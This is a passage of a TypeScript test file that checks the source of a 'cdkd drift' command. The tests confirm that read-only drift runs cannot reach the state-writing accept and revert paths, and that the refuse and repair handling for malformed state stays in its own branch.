    function occurrences(haystack: string, needle: string): number {
      return haystack.split(needle).length - 1;
    }
    for (const [arm, other, call] of [
      [refuseArm, repairArm, 'refuseMalformedState('],
      [refuseArm, repairArm, 'refuseMalformedResourceEntries('],
      [repairArm, refuseArm, 'repairMalformedResourcesForReadOnly('],
      [repairArm, refuseArm, 'repairMalformedResourceEntriesForReadOnly('],
    ] as const) {
      expect(arm, `${call} is no longer inside its own arm`).toContain(call);
      expect(other, `${call} leaked into the other arm`).not.toContain(call);
      expect(
        occurrences(body, call),
        `${call} appears more than once in runDriftForStack, so one copy runs in BOTH modes`
      ).toBe(1);
    }

    // The decision itself, pinned where it is MADE. `--accept` / `--revert` are
    // the only modes that reach `saveState`, and both rebuild the bag as a
    // spread, so both alternatives to refusing lose the evidence for the shape
    // that gets that far: a bag hand-edited into a LIST OF RESOURCE OBJECTS
    // walks fine, so spreading it unrepaired persists phantom rows keyed `0`,
    // `1`, while repairing it first persists a legitimate-looking empty stack.
    // No other shape reaches the spread: a non-empty string or a list with an
    // unreadable element throws in the walk, and the rest walk to zero entries
    // and report nothing.
    // Whitespace-NORMALISED before matching: the expression is 62 characters
    // today, so one rename wraps it across lines and a source-literal regex
    // reds on a formatter's decision rather than on a behaviour change.
    const flat = src.replace(/\s+/g, ' ');
    expect(
      flat,
      'the drift mode no longer decides refuse-vs-repair from --accept / --revert, so a ' +
        'write-capable run can reach the read-only repair.'
    ).toContain("options.accept || options.revert ? 'refuse' : 'repair'");

    // Non-vacuity for the spread claim above, COUNTED rather than tested for
    // presence: there are two writers (`--accept` and `--revert`) and each
    // rebuilds the bag itself, so a `toContain` survives either one changing
    // shape. If either stops being a spread the reasoning behind the refusal
    // changes for that writer and has to be re-derived.
    for (const writer of ['async function runAccept(', 'async function runRevert(']) {
      expect(
        flow(src, writer)
          .replace(/\s+/g, ' ')
          .match(/\{ \.\.\.report\.state\.resources \}/g) ?? [],
        `${writer} no longer rebuilds the bag by spreading it, so the laundering reasoning ` +
          'above has to be re-derived for that writer'
      ).toHaveLength(1);
    }

    // The INVARIANT the count alone does not establish: the load flow itself
    // must not persist. Everything above reasons "plain drift cannot write", and
    // a `saveState` added inside `runDriftForStack` would falsify that while
    // leaving the spread count untouched — the repair arm would then launder a
    // record on the read-only path.
    expect(
      body.includes('saveState('),
      'runDriftForStack now writes state, so its REPAIR arm can launder a malformed record.'
    ).toBe(false);
    // ...and the two saves that do exist are still the ones this reasoning is
    // about, so the count above keeps its subject.
    expect(src.match(/saveState\(/g) ?? []).toHaveLength(2);
    // ...and each one is INSIDE its own writer. A count alone permits moving a
    // save up into `driftCommand` ahead of the detection-only gate, where a
    // read-only run reaches it after the repair arm has already emptied the bag.
    for (const writer of ['async function runAccept(', 'async function runRevert(']) {
      expect(
        flow(src, writer).match(/saveState\(/g) ?? [],
        `${writer} no longer holds exactly one saveState, so a write may have moved out of it`
      ).toHaveLength(1);
    }

    // The GATE, which neither of the two above establishes: a detection-only
    // run must not REACH either writer. Replacing that condition with `false`
    // leaves the loader save-free and the save count unchanged while plain
    // `cdkd drift` falls through to `runRevert` — and then the repair arm has
    // laundered a record for a run that writes.
    const gateAt = src.indexOf('if (!options.accept && !options.revert) {');
    expect(gateAt, 'plain `cdkd drift` is no longer gated before the writers').toBeGreaterThan(-1);
    // TERMINATION, not the gate's text: emptying its body leaves the condition,
    // the selector and the writer counts all intact while a detection-only run
    // falls straight through to `runAccept` / `runRevert`.
    const gateBody = src.slice(gateAt, matchingCloseBrace(src, src.indexOf('{', gateAt)));
    // Indentation-INSENSITIVE: an earlier cut hard-coded 6- and 4-space
    // indents, so re-nesting the gate would have reddened it for a cosmetic
    // reason. What matters is that the last statement before its closing brace
    // is a `return`, which is what stops a non-drifted run falling through.
    const gateStatements = gateBody
      .slice(gateBody.indexOf('{') + 1, gateBody.lastIndexOf('}'))
      .split('\n')
      .map((line) => line.trim())
      .filter(Boolean);
    expect(
      gateStatements[gateStatements.length - 1],
      'the detection-only gate no longer ENDS by returning, so a non-drifted run falls through'
    ).toBe('return;');
    // The writers are reached only from the other side of that gate, and only
    // one of them per run.
    const selectorAt = src.indexOf('if (options.accept) {');
    expect(selectorAt, 'the writers are no longer selected by options.accept').toBeGreaterThan(-1);
    const acceptAt = src.indexOf('await runAccept(');
    const revertAt = src.indexOf('await runRevert(');
    // OPPOSITE ARMS of that selector, so a run cannot execute both. Replacing
    // the `else` with an unconditional block keeps both counts at one and both
    // calls after the gate, while an accepting run also reverts.
    const selectorClose = matchingCloseBrace(src, src.indexOf('{', selectorAt));
    expect(src.slice(selectorClose - 1).startsWith('} else {'), 'the writer selector lost its else').toBe(
      true
    );
    const acceptArm = src.slice(selectorAt, selectorClose - 1);
    const revertArm = src.slice(selectorClose - 1, matchingCloseBrace(src, src.indexOf('{', selectorClose - 1)));
    expect(acceptArm, 'runAccept left the accept arm').toContain('await runAccept(');
    expect(acceptArm, 'runRevert leaked into the accept arm').not.toContain('await runRevert(');
    expect(revertArm, 'runRevert left the else arm').toContain('await runRevert(');
    expect(revertArm, 'runAccept leaked into the else arm').not.toContain('await runAccept(');
    expect(src.match(/await runAccept\(/g) ?? []).toHaveLength(1);
    expect(src.match(/await runRevert\(/g) ?? []).toHaveLength(1);
    // DOMINANCE, not just presence: moving the whole gate BELOW the two writer
    // calls leaves its condition, its terminating body and both call counts
    // intact while a detection-only run reaches a writer first.
    // AFTER the gate's CLOSING BRACE, not merely after its start: moving a
    // writer call INTO the gate's body keeps every count, keeps the body ending
    // in `return`, and keeps `gateAt < writerAt` true, while plain drift reaches
    // that writer.
    const gateEnd = matchingCloseBrace(src, src.indexOf('{', gateAt));
    expect(acceptAt, 'runAccept moved INSIDE the detection-only gate').toBeGreaterThan(gateEnd);
    expect(revertAt, 'runRevert moved INSIDE the detection-only gate').toBeGreaterThan(gateEnd);
  });
});
